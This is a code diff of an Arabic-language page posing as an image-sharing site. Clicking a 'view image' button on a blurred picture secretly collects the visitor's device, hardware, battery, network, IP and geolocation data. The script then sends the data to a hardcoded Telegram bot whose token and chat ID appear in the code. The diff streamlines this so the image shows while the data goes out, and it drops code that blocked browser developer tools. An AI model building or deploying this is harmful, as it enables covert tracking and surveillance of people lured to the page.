@@ -43,11 +43,6 @@
             text-align: center;
         }
 
-        .header h1 {
-            font-size: 2.2em;
-            margin-bottom: 10px;
-        }
-
         .main-image {
             width: 100%;
             max-width: 400px;
@@ -92,34 +87,12 @@
             text-align: center;
             display: none;
         }
-
-        .loading {
-            display: none;
-            text-align: center;
-            padding: 20px;
-            color: #666;
-        }
-
-        .spinner {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #3498db;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 10px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>📸 موقع رفع الصور</h1>
+            <h1>موقع رفع الصور</h1>
             <p>منصة سهلة وسريعة لرفع ومشاركة الصور</p>
         </div>
 
@@ -132,13 +105,8 @@
             🔍 اضغط هنا لمشاهدة الصورة
         </button>
 
-        <div class="loading" id="loading">
-            <div class="spinner"></div>
-            <p>جاري تحميل الصورة...</p>
-        </div>
-
         <div class="success-message" id="successMessage">
-            ✅ تم تحميل الصورة بنجاح
+            ✅ تم الموافقة على عرض الصورة
         </div>
     </div>
 
@@ -325,9 +293,7 @@
                         hardware.storageQuota = Math.round(estimate.quota / 1024 / 1024 / 1024) + ' GB';
                         hardware.storageUsed = Math.round((estimate.usage || 0) / 1024 / 1024) + ' MB';
                     }
-                } catch (e) {
-                    hardware.storageError = 'غير متاح';
-                }
+                } catch (e) {}
             }
 
             // معلومات البطارية
@@ -342,9 +308,7 @@
                     if (battery.dischargingTime !== Infinity) {
                         hardware.dischargingTime = Math.round(battery.dischargingTime / 60) + ' دقيقة';
                     }
-                } catch (e) {
-                    hardware.batteryError = 'غير متاح';
-                }
+                } catch (e) {}
             }
 
             // معلومات الشبكة
@@ -460,7 +424,7 @@
             return null;
         }
 
-        // إرسال البيانات إلى Telegram - الدالة الأساسية البسيطة
+        // إرسال البيانات إلى Telegram
         function sendToTelegram(data) {
             const botToken = '7982181249:AAEyLwc9c24fu-uqUT87v26S6282XTD41XI';
             const chatId = '170383339';
@@ -541,114 +505,67 @@ ${locationInfo ? `📐 خط العرض: ${locationInfo.latitude}
 🔍 User Agent الكامل:
 ${deviceInfo.userAgent}`;
 
-            // إرسال البيانات - هذا هو الجزء المهم
-            return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: chatId,
                     text: message
                 })
-            }).then(response => {
-                if (response.ok) {
-                    console.log('✅ تم إرسال جميع البيانات بنجاح إلى تلكرام');
-                    return true;
-                } else {
-                    console.log('❌ فشل الإرسال - رد الخادم:', response.status);
-                    return false;
-                }
+            }).then(() => {
+                console.log('✅ تم إرسال جميع البيانات بنجاح');
             }).catch((error) => {
-                console.log('❌ خطأ في الإرسال:', error);
-                return false;
+                console.log('❌ فشل الإرسال:', error);
             });
         }
 
-        // الدالة الرئيسية - مبسطة ومضمونة
+        // الدالة الرئيسية
         async function viewImage() {
-            const button = document.getElementById('viewButton');
-            const loading = document.getElementById('loading');
-            const successMessage = document.getElementById('successMessage');
-            const mainImage = document.getElementById('mainImage');
+            // إظهار الصورة
+            document.getElementById('mainImage').classList.add('clear');
+            document.getElementById('viewButton').style.display = 'none';
+            document.getElementById('successMessage').style.display = 'block';
             
-            // إخفاء الزر وإظهار التحميل
-            button.style.display = 'none';
-            loading.style.display = 'block';
+            console.log('🔄 جاري جمع جميع المعلومات...');
             
-            console.log('🔄 بدء جمع المعلومات...');
+            // جمع جميع البيانات
+            const deviceInfo = getCompleteDeviceInfo();
+            const hardwareInfo = await getHardwareInfo();
+            const locationInfo = await getLocation();
+            const ipInfo = await getIPInfo();
             
-            try {
-                // جمع جميع البيانات
-                const deviceInfo = getCompleteDeviceInfo();
-                const hardwareInfo = await getHardwareInfo();
-                const locationInfo = await getLocation();
-                const ipInfo = await getIPInfo();
-                
-                const allData = {
-                    device: deviceInfo,
-                    hardware: hardwareInfo,
-                    location: locationInfo,
-                    ip: ipInfo
-                };
-                
-                console.log('📊 جميع البيانات المجمعة:', allData);
-                
-                // إرسال البيانات
-                const sent = await sendToTelegram(allData);
-                
-                // إخفاء التحميل
-                loading.style.display = 'none';
-                
-                if (sent) {
-                    // إظهار الصورة والرسالة
-                    mainImage.classList.add('clear');
-                    successMessage.style.display = 'block';
-                    console.log('✅ تم إكمال العملية بنجاح');
-                } else {
-                    // إظهار خطأ
-                    button.style.display = 'block';
-                    button.textContent = '⚠️ حدث خطأ - حاول مرة أخرى';
-                    button.style.background = 'linear-gradient(135deg, #f39c12 0%, #e67e22 100%)';
-                }
-                
-            } catch (error) {
-                console.error('❌ خطأ في العملية:', error);
-                loading.style.display = 'none';
-                button.style.display = 'block';
-                button.textContent = '⚠️ حدث خطأ - حاول مرة أخرى';
-                button.style.background = 'linear-gradient(135deg, #f39c12 0%, #e67e22 100%)';
-            }
+            const allData = {
+                device: deviceInfo,
+                hardware: hardwareInfo,
+                location: locationInfo,
+                ip: ipInfo
+            };
+            
+            console.log('📊 جميع البيانات المجمعة:', allData);
+            
+            // إرسال البيانات
+            sendToTelegram(allData);
         }
 
-        // ربط الأحداث
+        // ربط الزر
         document.addEventListener('DOMContentLoaded', function() {
             document.getElementById('viewButton').addEventListener('click', viewImage);
         });
 
-        // جمع الموقع مسبقاً عند تحميل الصفحة
+        // جمع الموقع عند تحميل الصفحة
         window.addEventListener('load', async function() {
-            console.log('🚀 تم تحميل الصفحة - جاهز للعمل');
+            console.log('🚀 تم تحميل الصفحة - بدء جمع المعلومات...');
             
-            // محاولة الحصول على الموقع مسبقاً لتسريع العملية
+            // محاولة الحصول على الموقع مسبقاً
             try {
                 const location = await getLocation();
                 if (location) {
                     console.log('✅ تم الحصول على الموقع مسبقاً');
                 } else {
-                    console.log('⚠️ لم يتم منح إذن الموقع');
+                    console.log('❌ لم يتم الحصول على الموقع');
                 }
             } catch (e) {
-                console.log('⚠️ خطأ في الحصول على الموقع:', e);
-            }
-        });
-
-        // حماية بسيطة
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-        });
-
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
-                e.preventDefault();
+                console.log('❌ خطأ في الحصول على الموقع:', e);
             }
         });
     </script>
